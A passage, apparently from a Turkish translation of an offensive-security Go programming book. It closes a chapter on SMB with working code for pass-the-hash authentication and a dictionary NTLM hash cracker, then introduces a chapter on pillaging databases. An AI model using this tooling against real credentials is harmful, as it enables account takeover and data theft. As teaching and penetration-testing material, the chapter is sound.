### Hash'in Hesaplanması

Liste 6-15'te, hash hesaplama işini yapan sihri gerçekleştiriyorsunuz.

```go
func NewAuthenticatePass(domain, user, workstation, password string, c Challenge) Authenticate {

      // Assumes domain, user, and workstation are not unicode
      nthash := Ntowfv2(password, user, domain)
      lmhash := Lmowfv2(password, user, domain)
      return newAuthenticate(domain, user, workstation, nthash, lmhash, c)
}

func NewAuthenticateHash(domain, user, workstation, hash string, c Challenge) Authenticate {
    // Assumes domain, user, and workstation are not unicode
    buf := make([]byte, len(hash)/2)
    hex.Decode(buf, []byte(hash))
    return newAuthenticate(domain, user, workstation, buf, buf, c)
}
```

**Liste 6-15: Hash'lerin hesaplanması (`/ch-6/smbintimssp/ntlmssp.go`)**

Uygun fonksiyonu çağırmaya yönelik mantık başka yerde tanımlanmıştır, ancak iki fonksiyonun benzer olduğunu görebilirsiniz. Asıl fark, `NewAuthenticatePass()` fonksiyonundaki parolaya dayalı kimlik doğrulamanın, kimlik doğrulama mesajını üretmeden önce hash'i hesaplamasıdır; buna karşın `NewAuthenticateHash()` fonksiyonu bu adımı atlar ve verilen hash'i doğrudan mesajı üretmek için girdi olarak kullanır.

### NT Hash'inin Kurtarılması

Liste 6-16'da, verilen bir NTLM hash'ini kırarak parolayı geri kazanan bir yardımcı program görebilirsiniz.

```go
func main() {
    if len(os.Args) != 5 {
        log.Fatalln("Usage: main <dictionary/file> <user> <domain> <hash>")
    }

    hash := make([]byte, len(os.Args[4])/2)
    _, err := hex.Decode(hash, []byte(os.Args[4]))
    if err != nil {
        log.Fatalln(err)
    }

    f, err := ioutil.ReadFile(os.Args[1])
    if err != nil {
        log.Fatalln(err)
    }

    var found string
    passwords := bytes.Split(f, []byte{'\n'})
    for _, password := range passwords {
        h := ntlmssp.Ntowfv2(string(password), os.Args[2], os.Args[3])
        if bytes.Equal(hash, h) {
            found = string(password)
            break
        }
    }

    if found != "" {
        fmt.Printf("[+] Recovered password: %s\n", found)
    } else {
        fmt.Println("[-] Failed to recover password")
    }
}
```

**Liste 6-16: NTLM hash kırma (`/ch-6/password-recovery/main.go`)**

Bu yardımcı program, hash'i komut satırı argümanı olarak okur ve onu `[]byte`'a dekode eder. Ardından, verilen parola listesi üzerinde döngüye girersiniz; daha önce tartıştığımız `ntlmssp.Ntowfv2()` fonksiyonunu çağırarak listedeki her girdinin hash'ini hesaplarsınız. Son olarak, hesaplanan hash'i elimizdeki verilmiş hash ile karşılaştırırsınız. Eğer eşleşirlerse, bir isabet (hit) almış olursunuz ve döngüden çıkarsınız.

### Özet

Bu bölümde, SMB'yi ayrıntılı bir şekilde incelediniz; protokole özgü ayrıntılara, yansıtma (reflection), yapı alan etiketleri (structure field tags) ve karışık kodlamaya değindiniz. Ayrıca, pass-the-hash'in nasıl çalıştığını ve SMB paketinden yararlanan birkaç kullanışlı yardımcı programı öğrendiniz.

Öğrenmeye devam etmek için, özellikle PsExec gibi uzaktan kod yürütme ile ilişkili ek SMB haberleşmelerini keşfetmenizi öneririz. Wireshark gibi bir ağ dinleyici (network sniffer) kullanarak paketleri yakalayın ve bu işlevselliğin nasıl çalıştığını inceleyin.

Bir sonraki bölümde, ağ protokolü ayrıntılarından uzaklaşarak veritabanlarına saldırmaya ve bunları talan etmeye (pillage) odaklanacağız.

---

## VERİTABANLARINI VE DOSYA SİSTEMLERİNİ SUİSTİMAL ETMEK

Artık, aktif servis sorgulama, komuta ve kontrol ve diğer kötü amaçlı faaliyetler için kullanılan yaygın ağ protokollerinin büyük bölümünü ele aldığımıza göre, odağımızı aynı derecede önemli bir konuya çevirelim: veri talanı (data pillaging).

Veri talanı, başlangıç sömürüsü (initial exploitation), ağ içinde yatay hareket (lateral movement) veya ayrıcalık yükseltme (privilege escalation) kadar heyecan verici olmayabilir; ancak, tüm saldırı zincirinin kritik bir yönüdür. Sonuçta, çoğu zaman bu diğer faaliyetleri gerçekleştirmek için veriye ihtiyaç duyarız. Çoğunlukla bu veriler, saldırgan için somut bir değere sahiptir. Bir kuruluşu hacklemek heyecan verici olsa da, verinin bizzat kendisi saldırgan için kârlı bir ganimet, kuruluş içinse yıkıcı bir kayıptır.

Okuduğunuz rapora bağlı olarak, 2020 yılında gerçekleşen bir ihlalin bir kuruluşa maliyeti yaklaşık 4 ila 7 milyon dolar olabilir. IBM tarafından yapılan bir çalışma, çalınan her bir kayıt için bir kuruluşa 129 ila 355 dolar arasında bir maliyet çıktığını tahmin etmektedir. Lanet olsun, kara şapkalı (black hat) bir hacker, kredi kartlarını yeraltı pazarında kart başına 7 ila 80 dolar arasında bir fiyatla satarak ciddi para kazanabilir (http://onlineavsj.com/public/resources/documents/secureworks_hacker_annualreport4941).

Target ihlali tek başına 40 milyon kartın ele geçirilmesiyle sonuçlandı. Bazı durumlarda, Target kartları kart başına 135 dolara kadar satıldı (http://www.businessinsider.com/heres-what-happened-to-your-target-data-that-was-hacked-2014-10/). Bu oldukça kârlı. Biz, hiçbir şekilde bu tür faaliyetleri teşvik etmiyoruz; ancak, ahlaki pusulası tartışılır kişiler veri talanı sayesinde çok fazla para kazanabilir.

Sektör ve çevrimiçi makalelere yapılan havalı referanslardan yeterince bahsettik—hadi talana başlayalım! Bu bölümde, çeşitli SQL ve NoSQL veritabanlarını nasıl kurup veriyle dolduracağınızı (seed) ve bunlara Go aracılığıyla nasıl bağlanıp etkileşim kuracağınızı öğreneceksiniz. Ayrıca, veritabanı ve dosya sistemi içinde, iştah kabartıcı (juicy) bilgilerin kilit göstergelerini (key indicators) arayan bir veri madencisini nasıl oluşturacağınızı da göstereceğiz.
